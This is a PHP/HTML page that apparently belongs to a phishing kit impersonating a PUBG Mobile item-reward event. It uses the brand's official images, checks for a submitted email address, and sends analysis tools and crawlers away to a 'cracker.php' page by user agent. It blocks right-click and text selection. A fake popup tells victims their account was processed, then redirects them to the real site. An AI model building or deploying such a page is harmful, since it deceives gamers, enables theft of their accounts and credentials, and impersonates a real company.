<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
$email = $_POST['email'];

if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content=" X-Suit">
<meta name="description" content="Warrior of Legends Hit the Front Lines">
<meta property="og:description" content="Warrior of Legends Hit the Front Lines">
<meta property="og:url" content="./">
<meta property="og:site_name" content=" X-Suit">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="img/kv_logo.jpg">
<title> X-Suit</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="containerHome rewardsBox">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<div class="sliderHeader"><img src="img/namekheader.jpg" style="width: 100%;"></div>
<div class="box">
<center>
<div class="" style="background: url(img/Nameksub.png) no-repeat center;background-size: 100% 100%;width: 100%;height: 50px">
<center><font style="font-size: 18px;color: #866d6b;position:absolute;left: 18%;top: 1.2%"> </font></center>
</div>
<div class="alert-wrapper">
<div class="alert">
<div class="alert-time">
<div id="latestTimer"></div>
</div>
<div class="slider animated fadeIn">Check your mail BOX to collect Rewards</div>
<div class="slider animated fadeIn">After 24 Hours</div>
</div>
</div> <!--- alert-wrapper --->
<div class="tab_rewards" id="latest">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="img/reward/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/reward/6.png">Collect</button>
</div>
</div>
</div>
</center>
<div class="twitter-content">
                            <p class="awalbtn"><i></i>TWITTER</p>
                            <p class="com_main">
                                <a class="twitter-timeline" href="https://twitter.com/PUBGMOBILE" data-theme="dark" data-height="inherit" data-chrome="noheader nofooter" onclick="gtag('event', 'x_click', {'event_category': 'website','event_label': 'pc_par_community_twitter'});"></a>
                            </p>
                        </div>
                    
                    
                </div>
                <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
                <a href="#" class="btn-top"></a>
            </div>
        </section>
        <div class="dialog">
            <div class="pop pop1" id="pop1">
                <div>
</div> <!--- tab_rewards --->
</center>
</div> <!--- box --->
<img src="img/footer.jpg" style="width: 100%">
</div> <!--- footer --->

<div class="popup">
<div class="popup-box">
<div class="nav-popup"><div class="nav-popup-title">Processing</div></div>
<div class="popup-alert">
Thank you for participating in our event. 
<br>
<br>
We are happy that you are still loyal to PUBGMobile. Currently your accounts has been successfully processed for the item you selected, your item will be received in the PUBGMobile mail inbox. 
<br>
We will also notify you to your email if we have successfully sent your item. Please wait up to 2 working days.
<br>
<br>
</div>
<div class="popup-btn-wrapper" style="height: 40px;">
<button type="button" onmousedown="buka.play();" class="popup-btn-active-center" onclick="location.href='https://pubgmobile.com/';">Accept</button>
</div>
</div>
</div>

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>